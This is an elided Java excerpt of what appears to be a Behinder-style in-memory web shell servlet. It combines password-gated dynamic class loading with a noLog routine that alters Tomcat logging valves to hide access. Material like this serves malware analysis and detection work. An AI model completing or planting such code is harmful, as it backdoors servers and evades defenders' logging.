...
public class BehOldDemoServlet extends ClassLoader implements Servlet {
  ...
  private void noLog(PageContext pc) {
    try {
      ...
      ArrayList arrayList;
      for (arrayList = new ArrayList(); container != null;
            ...
            while (true) {
              while (true) {
                ...
                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[]) null) != null
                    && this.getMethodByClass(valve.getClass(), "setCondition", String.class)
                    != null) {
                ...
                } else if (Class.forName("org.apache.catalina.Valve", false,
  ...
  public void _jspService(HttpServletRequest request, HttpServletResponse response)
    ...
    try {
      ...
      if (request.getParameter(this.pwd) == null) {
        ...
        (new BehOldDemoServlet(this.getClass().getClassLoader()))
